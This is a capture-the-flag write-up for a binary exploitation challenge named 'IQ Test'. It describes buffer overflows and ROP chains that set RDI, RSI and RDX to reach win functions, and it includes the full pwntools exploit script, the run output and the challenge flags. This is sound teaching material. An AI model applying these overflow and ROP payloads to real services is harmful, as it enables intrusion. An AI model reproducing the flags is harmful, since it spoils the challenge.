
# 4. IQ Test

## Solution:

Analysing the decomplied code in ghidra, we can see that the program was a 64-bit binary with no stack protection, we were able to overwrite RIP by controlling the buffer overflow caused by each `fgets()`.

We used a 152-byte overflow in main to reroute execution into `win1` after first completing the quiz to get to Lesson 1. Another overflow inside win1 enabled us to construct a ROP chain that satisfied its artifact check by setting RDI = 0xDEADBEEF and jumping to `win2`.

We were able to complete a ROP chain by loading three register arguments `(RDI, RSI, and RDX)` with `0xDEADBEEF, 0xDEAFFACE, and 0xFEEDCAFE` due to a final overflow inside win2. After that, we jumped to `win3`, which printed the actual flag.

I used the following python script to do this-
```from pwn import *
import time

p=remote("iqtest.nitephase.live",51823)

w1=0x401401
w2=0x401314
w3=0x4011e6
r=0x4017d6
s=0x4017d8
dx=0x4017da
rt=0x40101a

p1=b"A"*152+p64(rt)+p64(w1)
p2=b"A"*40+p64(rt)+p64(r)+p64(0xdeadbeef)+p64(w2)
p3=b"A"*56+p64(rt)+p64(r)+p64(0xdeadbeef)+p64(s)+p64(0xdeafface)+p64(dx)+p64(0xfeedcafe)+p64(w3)

p.sendline(b"2")
time.sleep(0.5)
p.sendline(b"1")
time.sleep(0.5)
p.sendline(b"4")
time.sleep(0.4)
p.sendline(p1)
time.sleep(0.4)
p.sendline(p2)
time.sleep(0.4)
p.sendline(p3)

p.interactive()
```
```
plsworkgod@LoqedIn:/mnt/c/Users/Karni/Desktop/Everything/CTF/iqtest/src$ python3 solve.py
[+] Opening connection to iqtest.nitephase.live on port 51823: Done
[*] Switching to interactive mode
=========== Welcome to the Exploitation Dojo ==============
You must first prove your knowledge if you want access to my secrets
Question 1: In an x86-64 Linux architecture, a function reads its arguments from the stack, left-to-right. True or False?
[1] True
[2] False
> Correct!
Question 2: In an x86-64 Linux architecture, which register holds the first integer or pointer argument to a function?
[1] RDI
[2] RSI
[3] RAX
[4] RCX
> Correct!
Question 3: In an x86-64 Linux architecture, where is the return value of a function typically stored?
[1] RDX
[2] RSP
[3] RBP
[4] RAX
> Correct!
You may have passed my test but I must see you display your knowledge before you can access my secrets
Lesson 1: For your first challenge you have to simply jump to the function at this address: 0x401401
You have passed the first challenge. The next one won't be so simple.
Lesson 2 Arguments: Research how arguments are passed to functions and apply your learning. Bring the artifact of 0xDEADBEEF to the temple of 0x401314 to claim your advance.nite{d1d_1_g3t_th3_fl4g?}
Continue:
You have done well, however you still have one final test. You must now bring 3 artifacts of [0xDEADBEEF] [0xDEAFFACE] and [0xFEEDCAFE]. You must venture out and find the temple yourself. I believe in you
nite{1_th1nk_1_f1n4lly_g0t_my_fl4g_n0w;)}
Final Test:
Congratulations. You are deserving of you reward

nite{1m_th3_r34l_fl4g_blud_4l50_6-1_1s_m0r3_tuf}
```


## Flag:

```
nite{d1d_1_g3t_th3_fl4g?}
nite{1_th1nk_1_f1n4lly_g0t_my_fl4g_n0w;)}
nite{1m_th3_r34l_fl4g_blud_4l50_6-1_1s_m0r3_tuf}
```

## Concepts learnt:

- Learnt how manage multiple different overflows.
- Learn to use ret for alignment issues.

## Notes:

- NONE
  
## Resources:

- NONE

***

